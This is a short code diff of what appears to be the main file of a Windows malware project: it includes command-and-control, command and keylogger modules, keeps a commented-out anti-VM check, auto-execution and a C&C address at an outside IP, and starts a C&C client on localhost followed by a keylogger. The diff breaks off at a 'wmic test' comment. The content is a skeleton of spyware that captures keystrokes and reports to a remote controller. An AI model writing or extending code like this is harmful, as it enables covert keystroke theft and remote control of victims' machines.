@@ -1,8 +1,9 @@
 #include "cncManager.h"
 #include "commandManager.h"
 #include "keyLogger.h"
-#include "initialize.h"
-#include "wmic.h"
+//#include "initialize.h"
+//#include "wmic.h"
+
 
 #include <stdlib.h>
 #include <iostream>
@@ -11,13 +12,13 @@
 
 //int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow){
 int main() {
-    
+
     //if (Anti_VM()) {
     if (true) {
         //autoExecute();
         //cncManager client(L"1.251.227.66");
         cncManager client(L"127.0.0.1");
-
+        
         keyLogger logger;
 
         /* wmic test
